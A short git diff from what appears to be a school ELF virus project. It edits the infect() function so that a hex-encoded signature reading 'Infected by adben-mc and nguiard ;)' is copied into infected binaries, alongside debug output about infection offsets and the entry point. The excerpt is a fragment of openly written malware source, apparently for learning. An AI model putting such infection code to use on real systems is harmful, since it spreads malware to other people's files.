@@ -6,7 +6,7 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/25 14:29:09 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/25 15:31:57 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -25,6 +25,13 @@ bool	infect(profiling *this, const str path) {
 	struct stat file_stat = {0};
 	byte		*file_origin = NULL;
 	elf_data	data;
+	size_t		signature[5] = {
+		0x6465746365666E49,
+		0x6562646120796220,
+		0x646E6120636D2D6E,
+		0x6472616975676E20,
+		0x00293B20
+	};
 
 	(void)fd;
 	(void)ret;
@@ -74,9 +81,9 @@ bool	infect(profiling *this, const str path) {
 
 	printf("%lx + %lx - %x = %lx (%lx)\n", data.infection_offset_mem, this->size, _START_SIZE, data.elf->e_entry,
 		data.infection_offset_mem + this->size - _START_SIZE);
-	
+
 	//	Copy signature
-	ft_memcpy(data.file + data.infection_offset_file + this->size + SIGNATURE_OFFSET, this->signature, SIGNATURE_LEN);
+	ft_memcpy(data.file + data.infection_offset_file + this->size + SIGNATURE_OFFSET, (byte *)signature, 40);
 	printf("Written %s at 0x%lx\n", data.file + data.infection_offset_file + this->size + SIGNATURE_OFFSET,
 		data.infection_offset_file + this->size + SIGNATURE_OFFSET);
 
